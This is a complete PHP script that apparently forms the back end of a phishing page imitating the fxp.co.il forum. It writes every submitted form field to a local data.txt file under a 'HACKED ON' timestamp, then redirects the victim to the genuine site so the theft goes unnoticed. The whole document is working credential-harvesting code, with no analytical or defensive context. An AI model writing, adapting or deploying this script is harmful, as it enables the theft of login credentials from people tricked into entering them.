<?php
header('Location: https://www.fxp.co.il');
$handle=fopen("data.txt", "a");
$atim =time();
$atime=date("dS F Y", $atim);
fwrite($handle,"\r\n");
fwrite($handle,"\t\t\t\t\t\t\t HACKED ON:");
fwrite($handle,$atime);
fwrite($handle,"\r\n");
fwrite($handle,"\t\t\t\t\t\t======================================================");
fwrite($handle,"\r\n");
foreach($_POST as $variable=>$value)
{
fwrite($handle,"\t\t\t\t\t\t\t\t");
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fwrite($handle,"\t\t\t\t\t\t======================================================");
fclose($handle);
?>